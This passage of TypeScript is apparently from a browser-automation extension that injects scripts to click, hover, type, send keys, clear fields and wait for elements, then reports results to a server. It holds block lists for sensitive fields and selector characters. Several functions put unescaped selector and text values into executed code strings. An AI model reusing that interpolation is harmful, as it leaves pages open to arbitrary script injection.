      if (!Number.isInteger(tabId) || tabId < 0) {
        throw new Error(`Invalid tab ID: ${tabId}. Tab ID must be a positive integer.`);
      }

      if (!selector || typeof selector !== 'string') {
        throw new Error(`Invalid selector: selector must be a non-empty string.`);
      }

      // Basic CSS selector validation to prevent injection
      if (selector.includes('<') || selector.includes('>') || selector.includes('script')) {
        throw new Error(`Invalid selector: potentially dangerous characters detected.`);
      }

      // Validate that the tab exists and is accessible
      const tab = await browser.tabs.get(tabId);
      if (!tab || tab.status !== "complete") {
        throw new Error(`Tab ${tabId} not found or not ready`);
      }

      // Check if the tab URL is in the deny list
      if (tab.url && (await isDomainInDenyList(tab.url))) {
        throw new Error(`Domain in tab URL '${tab.url}' is in the deny list`);
      }

      // Execute click operation with element waiting
      const results = await browser.tabs.executeScript(tabId, {
        code: `
          (function() {
            return new Promise((resolve) => {
              try {
                let element = null;
                let attempts = 0;
                const maxAttempts = Math.max(1, ${waitForElement} / 100);
                
                function findAndClickElement() {
                  attempts++;
                  element = document.querySelector('${selector.replace(/'/g, "\\'")}');
                  
                  if (!element) {
                    if (attempts < maxAttempts) {
                      setTimeout(findAndClickElement, 100);
                      return;
                    } else {
                      resolve({
                        success: false,
                        elementFound: false,
                        clickExecuted: false,
                        message: "Element not found with selector: ${selector.replace(/'/g, "\\'")}"
                      });
                      return;
                    }
                  }
                  
                  // Security check - block clicks on sensitive elements
                  const tagName = element.tagName.toLowerCase();
                  const inputType = element.type?.toLowerCase();
                  if ((tagName === 'input' && (inputType === 'password' || inputType === 'file')) ||
                      tagName === 'script' || tagName === 'iframe') {
                    resolve({
                      success: false,
                      elementFound: true,
                      clickExecuted: false,
                      message: "Click blocked on sensitive element for security reasons"
                    });
                    return;
                  }
                  
                  // Scroll element into view if requested
                  if (${scrollIntoView}) {
                    element.scrollIntoView({
                      behavior: 'smooth',
                      block: 'center',
                      inline: 'nearest'
                    });
                  }
                  
                  // Get the button code for MouseEvent
                  const buttonCode = {
                    'left': 0,
                    'middle': 1,
                    'right': 2
                  }['${button}'];
                  
                  // Create modifiers object
                  const modifierKeys = {
                    ctrlKey: ${modifiers.ctrl || false},
                    altKey: ${modifiers.alt || false},
                    shiftKey: ${modifiers.shift || false},
                    metaKey: ${modifiers.meta || false}
                  };
                  
                  // Get element center coordinates for event
                  const rect = element.getBoundingClientRect();
                  const centerX = rect.left + rect.width / 2;
                  const centerY = rect.top + rect.height / 2;
                  
                  // Dispatch click event(s)
                  if ('${clickType}' === 'double') {
                    // For double click, dispatch both click and dblclick events
                    const clickEvent = new MouseEvent('click', {
                      bubbles: true,
                      cancelable: true,
                      view: window,
                      button: buttonCode,
                      buttons: 1 << buttonCode,
                      clientX: centerX,
                      clientY: centerY,
                      ...modifierKeys
                    });
                    element.dispatchEvent(clickEvent);
                    
                    const dblClickEvent = new MouseEvent('dblclick', {
                      bubbles: true,
                      cancelable: true,
                      view: window,
                      button: buttonCode,
                      buttons: 1 << buttonCode,
                      detail: 2,
                      clientX: centerX,
                      clientY: centerY,
                      ...modifierKeys
                    });
                    element.dispatchEvent(dblClickEvent);
                  } else if ('${button}' === 'right') {
                    // For right click, dispatch contextmenu event
                    const contextMenuEvent = new MouseEvent('contextmenu', {
                      bubbles: true,
                      cancelable: true,
                      view: window,
                      button: buttonCode,
                      buttons: 1 << buttonCode,
                      clientX: centerX,
                      clientY: centerY,
                      ...modifierKeys
                    });
                    element.dispatchEvent(contextMenuEvent);
                  } else {
                    // Regular click - also try the native click method
                    if (typeof element.click === 'function') {
                      element.click();
                    }
                    
                    const clickEvent = new MouseEvent('click', {
                      bubbles: true,
                      cancelable: true,
                      view: window,
                      button: buttonCode,
                      buttons: 1 << buttonCode,
                      clientX: centerX,
                      clientY: centerY,
                      ...modifierKeys
                    });
                    element.dispatchEvent(clickEvent);
                  }
                  
                  // Get element info
                  const style = window.getComputedStyle(element);
                  const isVisible = style.display !== 'none' && style.visibility !== 'hidden' &&
                                   rect.width > 0 && rect.height > 0;
                  
                  resolve({
                    success: true,
                    elementFound: true,
                    clickExecuted: true,
                    message: "Element clicked successfully",
                    elementInfo: {
                      exists: true,
                      visible: isVisible,
                      interactable: !element.disabled,
                      boundingRect: {
                        x: rect.x,
                        y: rect.y,
                        width: rect.width,
                        height: rect.height,
                        top: rect.top,
                        right: rect.right,
                        bottom: rect.bottom,
                        left: rect.left
                      }
                    }
                  });
                }
                
                findAndClickElement();
              } catch (error) {
                resolve({
                  success: false,
                  elementFound: false,
                  clickExecuted: false,
                  message: "Click failed: " + error.message
                });
              }
            });
          })();
        `
      });

      const result = results[0];
      await this.client.sendResourceToServer({
        resource: "click-result",
        correlationId,
        success: result.success,
        elementFound: result.elementFound,
        clickExecuted: result.clickExecuted,
        message: result.message,
        timestamp: Date.now(),
        elementInfo: result.elementInfo,
      });
    } catch (error) {
      console.error("Click element failed:", error);
      await this.client.sendResourceToServer({
        resource: "click-result",
        correlationId,
        success: false,
        elementFound: false,
        clickExecuted: false,
        message: `Click failed: ${error instanceof Error ? error.message : 'Unknown error'}`,
        timestamp: Date.now(),
      });
    }
  }

  private async hoverElement(
    correlationId: string,
    tabId: number,
    selector?: string,
    x?: number,
    y?: number,
    waitForElement: number = 5000
  ): Promise<void> {
    try {
      // Validate inputs
      if (!Number.isInteger(tabId) || tabId < 0) {
        throw new Error(`Invalid tab ID: ${tabId}. Tab ID must be a positive integer.`);
      }

      // Must have either selector or coordinates
      if (!selector && (x === undefined || y === undefined)) {
        throw new Error(`Either selector or x,y coordinates must be provided for hover`);
      }

      if (selector && (typeof selector !== 'string' || !selector)) {
        throw new Error(`Invalid selector: selector must be a non-empty string.`);
      }

      if (x !== undefined && (!Number.isInteger(x) || x < 0)) {
        throw new Error(`Invalid x coordinate: ${x}. X coordinate must be a non-negative integer.`);
      }

      if (y !== undefined && (!Number.isInteger(y) || y < 0)) {
        throw new Error(`Invalid y coordinate: ${y}. Y coordinate must be a non-negative integer.`);
      }

      // Basic CSS selector validation to prevent injection
      if (selector && (selector.includes('<') || selector.includes('>') || selector.includes('script'))) {
        throw new Error(`Invalid selector: potentially dangerous characters detected.`);
      }

      // Validate that the tab exists and is accessible
      const tab = await browser.tabs.get(tabId);
      if (!tab || tab.status !== "complete") {
        throw new Error(`Tab ${tabId} not found or not ready`);
      }

      // Check if the tab URL is in the deny list
      if (tab.url && (await isDomainInDenyList(tab.url))) {
        throw new Error(`Domain in tab URL '${tab.url}' is in the deny list`);
      }

      // Execute hover operation
      const results = await browser.tabs.executeScript(tabId, {
        code: `
          (function() {
            return new Promise((resolve) => {
              try {
                let element = null;
                let hoverX = ${x || 0};
                let hoverY = ${y || 0};
                
                ${selector ? `
                  // Find element by selector
                  let attempts = 0;
                  const maxAttempts = Math.max(1, ${waitForElement} / 100);
                  
                  function findElement() {
                    attempts++;
                    element = document.querySelector('${selector.replace(/'/g, "\\'")}');
                    
                    if (!element) {
                      if (attempts < maxAttempts) {
                        setTimeout(findElement, 100);
                        return;
                      } else {
                        resolve({
                          success: false,
                          elementFound: false,
                          message: "Element not found with selector: ${selector.replace(/'/g, "\\'")}"
                        });
                        return;
                      }
                    }
                    
                    performHover();
                  }
                  
                  function performHover() {
                    // Get element center coordinates
                    const rect = element.getBoundingClientRect();
                    hoverX = rect.left + rect.width / 2;
                    hoverY = rect.top + rect.height / 2;
                    
                    executeHover();
                  }
                  
                  findElement();
                ` : `
                  // Use coordinates directly
                  element = document.elementFromPoint(hoverX, hoverY);
                  executeHover();
                `}
                
                function executeHover() {
                  try {
                    // Dispatch mouseenter event (doesn't bubble)
                    const mouseEnterEvent = new MouseEvent('mouseenter', {
                      bubbles: false,
                      cancelable: false,
                      view: window,
                      clientX: hoverX,
                      clientY: hoverY
                    });
                    
                    // Dispatch mouseover event (bubbles)
                    const mouseOverEvent = new MouseEvent('mouseover', {
                      bubbles: true,
                      cancelable: true,
                      view: window,
                      clientX: hoverX,
                      clientY: hoverY
                    });
                    
                    if (element) {
                      element.dispatchEvent(mouseEnterEvent);
                      element.dispatchEvent(mouseOverEvent);
                    } else {
                      // If no element at coordinates, dispatch on document
                      document.dispatchEvent(mouseOverEvent);
                    }
                    
                    // Get element info if element exists
                    let elementInfo = undefined;
                    if (element) {
                      const rect = element.getBoundingClientRect();
                      const style = window.getComputedStyle(element);
                      const isVisible = style.display !== 'none' && style.visibility !== 'hidden' &&
                                       rect.width > 0 && rect.height > 0;
                      
                      elementInfo = {
                        exists: true,
                        visible: isVisible,
                        interactable: !element.disabled,
                        boundingRect: {
                          x: rect.x,
                          y: rect.y,
                          width: rect.width,
                          height: rect.height,
                          top: rect.top,
                          right: rect.right,
                          bottom: rect.bottom,
                          left: rect.left
                        }
                      };
                    }
                    
                    resolve({
                      success: true,
                      elementFound: !!element,
                      message: element ? "Hover executed successfully on element" : "Hover executed at coordinates",
                      elementInfo: elementInfo
                    });
                  } catch (error) {
                    resolve({
                      success: false,
                      elementFound: !!element,
                      message: "Hover failed: " + error.message
                    });
                  }
                }
              } catch (error) {
                resolve({
                  success: false,
                  elementFound: false,
                  message: "Hover failed: " + error.message
                });
              }
            });
          })();
        `
      });

      const result = results[0];
      await this.client.sendResourceToServer({
        resource: "hover-result",
        correlationId,
        success: result.success,
        elementFound: result.elementFound,
        message: result.message,
        timestamp: Date.now(),
        elementInfo: result.elementInfo,
      });
    } catch (error) {
      console.error("Hover element failed:", error);
      await this.client.sendResourceToServer({
        resource: "hover-result",
        correlationId,
        success: false,
        elementFound: false,
        message: `Hover failed: ${error instanceof Error ? error.message : 'Unknown error'}`,
        timestamp: Date.now(),
      });
    }
  }

  private async typeText(
    correlationId: string,
    tabId: number,
    text: string,
    selector?: string,
    clearFirst?: boolean,
    typeDelay?: number,
    waitForElement?: number
  ): Promise<void> {
    try {
      // Validate input parameters
      if (!Number.isInteger(tabId) || tabId < 0) {
        throw new Error(`Invalid tab ID: ${tabId}`);
      }
      
      if (typeof text !== 'string') {
        throw new Error('Text must be a string');
      }

      // Sanitize text to prevent script injection
      const sanitizedText = text.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '');
      
      // Security check for sensitive field patterns
      if (selector) {
        const sensitivePatterns = [
          /credit.?card/i,
          /ccn/i,
          /cvv/i,
          /ssn/i,
          /social.?security/i,
          /password/i,
          /pin/i
        ];
        
        if (sensitivePatterns.some(pattern => pattern.test(selector))) {
          throw new Error('Typing in sensitive fields is blocked for security');
        }
      }

      const finalTypeDelay = Math.max(0, Math.min(typeDelay || 0, 1000)); // Clamp between 0-1000ms
      const finalWaitForElement = Math.max(0, Math.min(waitForElement || 5000, 10000)); // Clamp between 0-10000ms

      const results = await browser.tabs.executeScript(tabId, {
        code: `
          (async function() {
            try {
              let targetElement;
              
              // Find target element
              if ("${selector}") {
                const selectorStr = "${selector}";
                targetElement = document.querySelector(selectorStr);
                
                if (!targetElement) {
                  // Wait for element if waitForElement is specified
                  if (${finalWaitForElement} > 0) {
                    const startTime = Date.now();
                    while (!targetElement && (Date.now() - startTime) < ${finalWaitForElement}) {
                      await new Promise(resolve => setTimeout(resolve, 100));
                      targetElement = document.querySelector(selectorStr);
                    }
                  }
                  
                  if (!targetElement) {
                    return {
                      success: false,
                      message: "Element not found: " + selectorStr,
                      charactersTyped: 0,
                      elementInfo: { exists: false, visible: false, interactable: false }
                    };
                  }
                }
              } else {
                // Use currently focused element
                targetElement = document.activeElement;
                if (!targetElement || targetElement === document.body) {
                  return {
                    success: false,
                    message: "No element is focused. Please provide a selector or focus an element first.",
                    charactersTyped: 0,
                    elementInfo: { exists: false, visible: false, interactable: false }
                  };
                }
              }

              // Check element properties
              const rect = targetElement.getBoundingClientRect();
              const isVisible = rect.width > 0 && rect.height > 0 &&
                               window.getComputedStyle(targetElement).visibility !== 'hidden' &&
                               window.getComputedStyle(targetElement).display !== 'none';
              
              const isInteractable = !targetElement.disabled && !targetElement.readOnly;
              
              if (!isVisible) {
                return {
                  success: false,
                  message: "Element is not visible",
                  charactersTyped: 0,
                  elementInfo: { exists: true, visible: false, interactable: isInteractable, boundingRect: rect }
                };
              }
              
              if (!isInteractable) {
                return {
                  success: false,
                  message: "Element is not interactable (disabled or readonly)",
                  charactersTyped: 0,
                  elementInfo: { exists: true, visible: true, interactable: false, boundingRect: rect }
                };
              }

              // Focus the element
              targetElement.focus();
              
              // Clear existing text if requested
              if (${clearFirst === true}) {
                if (targetElement.tagName === 'INPUT' || targetElement.tagName === 'TEXTAREA') {
                  targetElement.value = '';
                } else if (targetElement.contentEditable === 'true') {
                  targetElement.textContent = '';
                }
                
                // Dispatch change event after clearing
                targetElement.dispatchEvent(new Event('input', { bubbles: true }));
                targetElement.dispatchEvent(new Event('change', { bubbles: true }));
              }

              const textToType = "${sanitizedText}";
              let charactersTyped = 0;
              
              // Type text character by character with delay
              for (let i = 0; i < textToType.length; i++) {
                const char = textToType[i];
                
                // Set the value directly for input/textarea elements
                if (targetElement.tagName === 'INPUT' || targetElement.tagName === 'TEXTAREA') {
                  const currentValue = targetElement.value || '';
                  targetElement.value = currentValue + char;
                } else if (targetElement.contentEditable === 'true') {
                  const currentText = targetElement.textContent || '';
                  targetElement.textContent = currentText + char;
                }
                
                charactersTyped++;
                
                // Dispatch input event for each character
                targetElement.dispatchEvent(new Event('input', { bubbles: true }));
                
                // Add delay between characters if specified
                if (${finalTypeDelay} > 0 && i < textToType.length - 1) {
                  await new Promise(resolve => setTimeout(resolve, ${finalTypeDelay}));
                }
              }
              
              // Dispatch final change event
              targetElement.dispatchEvent(new Event('change', { bubbles: true }));
              
              return {
                success: true,
                message: \`Successfully typed \${charactersTyped} characters\`,
                charactersTyped: charactersTyped,
                elementInfo: { exists: true, visible: true, interactable: true, boundingRect: rect }
              };
              
            } catch (error) {
              return {
                success: false,
                message: "Type failed: " + error.message,
                charactersTyped: 0
              };
            }
          })();
        `
      });

      const result = results[0];
      await this.client.sendResourceToServer({
        resource: "type-result",
        correlationId,
        success: result.success,
        message: result.message,
        timestamp: Date.now(),
        charactersTyped: result.charactersTyped,
        elementInfo: result.elementInfo,
      });
    } catch (error) {
      console.error("Type text failed:", error);
      await this.client.sendResourceToServer({
        resource: "type-result",
        correlationId,
        success: false,
        message: `Type failed: ${error instanceof Error ? error.message : 'Unknown error'}`,
        timestamp: Date.now(),
        charactersTyped: 0,
      });
    }
  }

  private async sendSpecialKeys(
    correlationId: string,
    tabId: number,
    keys: string[],
    selector?: string,
    modifiers?: {
      ctrl?: boolean;
      alt?: boolean;
      shift?: boolean;
      meta?: boolean;
    }
  ): Promise<void> {
    try {
      // Validate input parameters
      if (!Number.isInteger(tabId) || tabId < 0) {
        throw new Error(`Invalid tab ID: ${tabId}`);
      }
      
      if (!Array.isArray(keys) || keys.length === 0) {
        throw new Error('Keys must be a non-empty array');
      }

      // Validate special keys
      const validKeys = [
        "Enter", "Tab", "Escape", "Backspace", "Delete", "ArrowUp", "ArrowDown",
        "ArrowLeft", "ArrowRight", "Home", "End", "PageUp", "PageDown",
        "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "F11", "F12"
      ];
      
      for (const key of keys) {
        if (!validKeys.includes(key)) {
          throw new Error(`Invalid key: ${key}. Allowed keys: ${validKeys.join(', ')}`);
        }
      }

      const finalModifiers = modifiers || {};

      const results = await browser.tabs.executeScript(tabId, {
        code: `
          (function() {
            try {
              let targetElement;
              
              // Find target element
              if ("${selector}") {
                const selectorStr = "${selector}";
                targetElement = document.querySelector(selectorStr);
                
                if (!targetElement) {
                  return {
                    success: false,
                    message: "Element not found: " + selectorStr,
                    elementInfo: { exists: false, visible: false, interactable: false }
                  };
                }
              } else {
                // Use currently focused element
                targetElement = document.activeElement;
                if (!targetElement || targetElement === document.body) {
                  return {
                    success: false,
                    message: "No element is focused. Please provide a selector or focus an element first.",
                    elementInfo: { exists: false, visible: false, interactable: false }
                  };
                }
              }

              // Focus the element
              targetElement.focus();
              
              const keyList = ${JSON.stringify(keys)};
              const modifierKeys = ${JSON.stringify(finalModifiers)};
              
              // Key code mapping
              const keyCodes = {
                "Enter": 13, "Tab": 9, "Escape": 27, "Backspace": 8, "Delete": 46,
                "ArrowUp": 38, "ArrowDown": 40, "ArrowLeft": 37, "ArrowRight": 39,
                "Home": 36, "End": 35, "PageUp": 33, "PageDown": 34,
                "F1": 112, "F2": 113, "F3": 114, "F4": 115, "F5": 116, "F6": 117,
                "F7": 118, "F8": 119, "F9": 120, "F10": 121, "F11": 122, "F12": 123
              };
              
              let successCount = 0;
              
              for (const key of keyList) {
                const keyCode = keyCodes[key];
                if (!keyCode) continue;
                
                // Create keyboard events
                const keydownEvent = new KeyboardEvent('keydown', {
                  key: key,
                  code: key,
                  keyCode: keyCode,
                  which: keyCode,
                  ctrlKey: modifierKeys.ctrl || false,
                  altKey: modifierKeys.alt || false,
                  shiftKey: modifierKeys.shift || false,
                  metaKey: modifierKeys.meta || false,
                  bubbles: true,
                  cancelable: true
                });
                
                const keyupEvent = new KeyboardEvent('keyup', {
                  key: key,
                  code: key,
                  keyCode: keyCode,
                  which: keyCode,
                  ctrlKey: modifierKeys.ctrl || false,
                  altKey: modifierKeys.alt || false,
                  shiftKey: modifierKeys.shift || false,
                  metaKey: modifierKeys.meta || false,
                  bubbles: true,
                  cancelable: true
                });
                
                // Dispatch events
                targetElement.dispatchEvent(keydownEvent);
                targetElement.dispatchEvent(keyupEvent);
                successCount++;
              }
              
              return {
                success: true,
                message: \`Successfully sent \${successCount} special keys\`,
                elementInfo: { exists: true, visible: true, interactable: true }
              };
              
            } catch (error) {
              return {
                success: false,
                message: "Send special keys failed: " + error.message
              };
            }
          })();
        `
      });

      const result = results[0];
      await this.client.sendResourceToServer({
        resource: "type-result",
        correlationId,
        success: result.success,
        message: result.message,
        timestamp: Date.now(),
        elementInfo: result.elementInfo,
      });
    } catch (error) {
      console.error("Send special keys failed:", error);
      await this.client.sendResourceToServer({
        resource: "type-result",
        correlationId,
        success: false,
        message: `Send special keys failed: ${error instanceof Error ? error.message : 'Unknown error'}`,
        timestamp: Date.now(),
      });
    }
  }

  private async clearInputField(
    correlationId: string,
    tabId: number,
    selector: string,
    waitForElement?: number
  ): Promise<void> {
    try {
      // Validate input parameters
      if (!Number.isInteger(tabId) || tabId < 0) {
        throw new Error(`Invalid tab ID: ${tabId}`);
      }
      
      if (!selector || typeof selector !== 'string') {
        throw new Error('Selector is required and must be a string');
      }

      const finalWaitForElement = Math.max(0, Math.min(waitForElement || 5000, 10000)); // Clamp between 0-10000ms

      const results = await browser.tabs.executeScript(tabId, {
        code: `
          (async function() {
            try {
              const selectorStr = "${selector}";
              let targetElement = document.querySelector(selectorStr);
              
              if (!targetElement) {
                // Wait for element if waitForElement is specified
                if (${finalWaitForElement} > 0) {
                  const startTime = Date.now();
                  while (!targetElement && (Date.now() - startTime) < ${finalWaitForElement}) {
                    await new Promise(resolve => setTimeout(resolve, 100));
                    targetElement = document.querySelector(selectorStr);
                  }
                }
                
                if (!targetElement) {
                  return {
                    success: false,
                    message: "Element not found: " + selectorStr,
                    elementInfo: { exists: false, visible: false, interactable: false }
                  };
                }
              }

              // Check element properties
              const rect = targetElement.getBoundingClientRect();
              const isVisible = rect.width > 0 && rect.height > 0 &&
                               window.getComputedStyle(targetElement).visibility !== 'hidden' &&
                               window.getComputedStyle(targetElement).display !== 'none';
              
              const isInteractable = !targetElement.disabled && !targetElement.readOnly;
              
              if (!isVisible) {
                return {
                  success: false,
                  message: "Element is not visible",
                  elementInfo: { exists: true, visible: false, interactable: isInteractable, boundingRect: rect }
                };
              }
              
              if (!isInteractable) {
                return {
                  success: false,
                  message: "Element is not interactable (disabled or readonly)",
                  elementInfo: { exists: true, visible: true, interactable: false, boundingRect: rect }
                };
              }

              // Focus the element
              targetElement.focus();
              
              // Clear the input field based on element type
              let wasCleared = false;
              const originalValue = targetElement.value || targetElement.textContent || '';
              
              if (targetElement.tagName === 'INPUT' || targetElement.tagName === 'TEXTAREA') {
                targetElement.value = '';
                wasCleared = true;
              } else if (targetElement.contentEditable === 'true') {
                targetElement.textContent = '';
                wasCleared = true;
              } else {
                return {
                  success: false,
                  message: "Element is not a clearable input field (must be input, textarea, or contenteditable)",
                  elementInfo: { exists: true, visible: true, interactable: true, boundingRect: rect }
                };
              }
              
              if (wasCleared) {
                // Dispatch events to notify of the change
                targetElement.dispatchEvent(new Event('input', { bubbles: true }));
                targetElement.dispatchEvent(new Event('change', { bubbles: true }));
                
                // Verify the field was actually cleared
                const newValue = targetElement.value || targetElement.textContent || '';
                const actuallyCleared = newValue.length === 0;
                
                return {
                  success: actuallyCleared,
                  message: actuallyCleared
                    ? \`Successfully cleared input field (was \${originalValue.length} characters)\`
                    : "Failed to clear input field - value may be controlled by JavaScript",
                  elementInfo: { exists: true, visible: true, interactable: true, boundingRect: rect }
                };
              } else {
                return {
                  success: false,
                  message: "Failed to clear input field",
                  elementInfo: { exists: true, visible: true, interactable: true, boundingRect: rect }
                };
              }
              
            } catch (error) {
              return {
                success: false,
                message: "Clear input field failed: " + error.message
              };
            }
          })();
        `
      });

      const result = results[0];
      await this.client.sendResourceToServer({
        resource: "type-result",
        correlationId,
        success: result.success,
        message: result.message,
        timestamp: Date.now(),
        elementInfo: result.elementInfo,
      });
    } catch (error) {
      console.error("Clear input field failed:", error);
      await this.client.sendResourceToServer({
        resource: "type-result",
        correlationId,
        success: false,
        message: `Clear input field failed: ${error instanceof Error ? error.message : 'Unknown error'}`,
        timestamp: Date.now(),
      });
    }
  }

  private async waitForTime(
    correlationId: string,
    duration: number,
    message?: string
  ): Promise<void> {
    try {
      // Validate duration is within acceptable range (100ms to 30000ms)
      if (duration < 100 || duration > 30000) {
        throw new Error(`Invalid duration: ${duration}ms. Duration must be between 100ms and 30000ms`);
      }

      const startTime = Date.now();
      
      // Simple promise-based delay
      await new Promise(resolve => setTimeout(resolve, duration));
      
      const actualWaitTime = Date.now() - startTime;
      const responseMessage = message
        ? `${message} (waited ${actualWaitTime}ms)`
        : `Waited for ${actualWaitTime}ms`;

      await this.client.sendResourceToServer({
        resource: "wait-result",
        correlationId,
        success: true,
        message: responseMessage,
        timestamp: Date.now(),
        conditionMet: true,
        waitTime: actualWaitTime,
      });
    } catch (error) {
      await this.client.sendResourceToServer({
        resource: "wait-result",
        correlationId,
        success: false,
        message: `Wait for time failed: ${error instanceof Error ? error.message : 'Unknown error'}`,
        timestamp: Date.now(),
        conditionMet: false,
        waitTime: 0,
      });
    }
  }

  private async waitForElement(
    correlationId: string,
    tabId: number,
    selector: string,
    timeout: number = 5000,
    pollInterval: number = 100,
    visible: boolean = false
  ): Promise<void> {
    try {
      // Validate inputs
      if (!Number.isInteger(tabId) || tabId < 0) {
        throw new Error(`Invalid tab ID: ${tabId}`);
      }

      if (!selector || typeof selector !== 'string') {
        throw new Error('Selector is required and must be a string');
      }

      if (timeout < 100 || timeout > 30000) {
        throw new Error(`Invalid timeout: ${timeout}ms. Timeout must be between 100ms and 30000ms`);
      }

      if (pollInterval < 50 || pollInterval > 1000) {
        throw new Error(`Invalid poll interval: ${pollInterval}ms. Poll interval must be between 50ms and 1000ms`);
      }

      const startTime = Date.now();

      // Check if tab exists
      let tab;
      try {
        tab = await browser.tabs.get(tabId);
      } catch (tabError) {
        throw new Error(`Tab with ID ${tabId} not found or is not accessible`);
      }

      if (!tab.url) {
        throw new Error(`Tab ${tabId} does not have a valid URL`);
      }

      // Use MutationObserver-based approach for better performance
      const results = await browser.tabs.executeScript(tabId, {
        code: `
        (function() {
          const selector = ${JSON.stringify(selector)};
          const timeout = ${timeout};
          const pollInterval = ${pollInterval};
          const checkVisible = ${visible};
          const startTime = Date.now();

          function isElementVisible(element) {
            if (!element) return false;
            
            const style = window.getComputedStyle(element);
            if (style.display === 'none' || style.visibility === 'hidden' || style.opacity === '0') {
              return false;
            }
            
            const rect = element.getBoundingClientRect();
            return rect.width > 0 && rect.height > 0;
          }

          function getElementInfo(element) {
            if (!element) {
              return { exists: false, visible: false, interactable: false };
            }
            
            const visible = isElementVisible(element);
            const rect = element.getBoundingClientRect();
            
            return {
              exists: true,
              visible: visible,
              interactable: visible && !element.disabled,
              boundingRect: {
                x: rect.x,
                y: rect.y,
                width: rect.width,
                height: rect.height,
                top: rect.top,
                right: rect.right,
                bottom: rect.bottom,
                left: rect.left
              }
            };
          }

          return new Promise((resolve) => {
            // Check if element already exists
            const existingElement = document.querySelector(selector);
            if (existingElement && (!checkVisible || isElementVisible(existingElement))) {
              const waitTime = Date.now() - startTime;
              resolve({
                success: true,
                found: true,
                waitTime: waitTime,
                elementInfo: getElementInfo(existingElement)
              });
              return;
            }

            let timeoutId;
            let intervalId;

            // Use MutationObserver for better performance
            const observer = new MutationObserver((mutations) => {
              const element = document.querySelector(selector);
              if (element && (!checkVisible || isElementVisible(element))) {
                clearTimeout(timeoutId);
                clearInterval(intervalId);
                observer.disconnect();
                
                const waitTime = Date.now() - startTime;
                resolve({
                  success: true,
                  found: true,
                  waitTime: waitTime,
                  elementInfo: getElementInfo(element)
                });
              }
            });

            // Observe for changes in the entire document
            observer.observe(document.body || document.documentElement, {
              childList: true,
              subtree: true,
              attributes: checkVisible ? true : false,
              attributeFilter: checkVisible ? ['style', 'class'] : undefined
            });

            // Fallback polling in case MutationObserver misses something
            intervalId = setInterval(() => {
              const element = document.querySelector(selector);
              if (element && (!checkVisible || isElementVisible(element))) {
                clearTimeout(timeoutId);
                clearInterval(intervalId);
                observer.disconnect();
                
                const waitTime = Date.now() - startTime;
                resolve({
                  success: true,
                  found: true,
                  waitTime: waitTime,
                  elementInfo: getElementInfo(element)
                });
              }
            }, pollInterval);

            // Timeout handler
            timeoutId = setTimeout(() => {
              clearInterval(intervalId);
              observer.disconnect();
              
              const waitTime = Date.now() - startTime;
              const element = document.querySelector(selector);
              resolve({
                success: false,
                found: false,
                waitTime: waitTime,
                elementInfo: getElementInfo(element),
                error: \`Element "\${selector}" not found\${checkVisible ? ' or not visible' : ''} after \${timeout}ms\`
              });
            }, timeout);
          });
        })();
        `,
      });

      const result = results[0];
      const actualWaitTime = Date.now() - startTime;

      if (result.success) {
        await this.client.sendResourceToServer({
          resource: "wait-result",
          correlationId,
          success: true,
          message: `Element "${selector}" found after ${result.waitTime}ms`,
          timestamp: Date.now(),
          conditionMet: true,
          waitTime: actualWaitTime,
          elementInfo: result.elementInfo,
        });
      } else {
        await this.client.sendResourceToServer({
          resource: "wait-result",
          correlationId,
          success: false,
          message: result.error || `Element "${selector}" not found after ${timeout}ms`,
          timestamp: Date.now(),
          conditionMet: false,
          waitTime: actualWaitTime,
          elementInfo: result.elementInfo,
        });
      }
    } catch (error) {
      await this.client.sendResourceToServer({
        resource: "wait-result",
        correlationId,
        success: false,
        message: `Wait for element failed: ${error instanceof Error ? error.message : 'Unknown error'}`,
        timestamp: Date.now(),
        conditionMet: false,
        waitTime: 0,
      });
    }
  }

  private async waitForElementVisibility(
    correlationId: string,
    tabId: number,
    selector: string,
    timeout: number = 5000,
    threshold: number = 0.1
  ): Promise<void> {
    try {
      // Validate inputs
      if (!Number.isInteger(tabId) || tabId < 0) {
        throw new Error(`Invalid tab ID: ${tabId}`);
      }

      if (!selector || typeof selector !== 'string') {
        throw new Error('Selector is required and must be a string');
      }

      if (timeout < 100 || timeout > 30000) {
        throw new Error(`Invalid timeout: ${timeout}ms. Timeout must be between 100ms and 30000ms`);
      }

      if (threshold < 0 || threshold > 1) {
        throw new Error(`Invalid threshold: ${threshold}. Threshold must be between 0 and 1`);
      }

      const startTime = Date.now();

      // Check if tab exists
      let tab;
      try {
        tab = await browser.tabs.get(tabId);
      } catch (tabError) {
        throw new Error(`Tab with ID ${tabId} not found or is not accessible`);
      }

      if (!tab.url) {
        throw new Error(`Tab ${tabId} does not have a valid URL`);
      }

      // Use IntersectionObserver for efficient visibility detection
      const results = await browser.tabs.executeScript(tabId, {
        code: `
        (function() {
          const selector = ${JSON.stringify(selector)};
          const timeout = ${timeout};
          const threshold = ${threshold};
          const startTime = Date.now();

          function getElementInfo(element) {
            if (!element) {
              return { exists: false, visible: false, interactable: false };
            }
            
            const style = window.getComputedStyle(element);
            const rect = element.getBoundingClientRect();
            const visible = style.display !== 'none' &&
                           style.visibility !== 'hidden' &&
                           style.opacity !== '0' &&
                           rect.width > 0 && rect.height > 0;
            
            return {
              exists: true,
              visible: visible,
              interactable: visible && !element.disabled,
              boundingRect: {
                x: rect.x,
                y: rect.y,
                width: rect.width,
                height: rect.height,
                top: rect.top,
                right: rect.right,
                bottom: rect.bottom,
                left: rect.left
              }
            };
          }

          return new Promise((resolve) => {
            // Check if element exists first
            let element = document.querySelector(selector);
            if (!element) {
              // Wait for element to exist using MutationObserver
              const mutationObserver = new MutationObserver(() => {
                element = document.querySelector(selector);
                if (element) {
                  mutationObserver.disconnect();
                  setupIntersectionObserver();
                }
              });

              mutationObserver.observe(document.body || document.documentElement, {
                childList: true,
                subtree: true
              });

              // Timeout for element existence
              setTimeout(() => {
                mutationObserver.disconnect();
                const waitTime = Date.now() - startTime;
                resolve({
                  success: false,
                  found: false,
                  waitTime: waitTime,
                  elementInfo: getElementInfo(null),
                  error: \`Element "\${selector}" not found in DOM after \${timeout}ms\`
                });
              }, timeout);
            } else {
              setupIntersectionObserver();
            }

            function setupIntersectionObserver() {
              // Check if already visible
              const elementInfo = getElementInfo(element);
              if (elementInfo.visible) {
                const waitTime = Date.now() - startTime;
                resolve({
                  success: true,
                  found: true,
                  waitTime: waitTime,
                  elementInfo: elementInfo
                });
                return;
              }

              // Use IntersectionObserver for visibility detection
              const intersectionObserver = new IntersectionObserver((entries) => {
                entries.forEach(entry => {
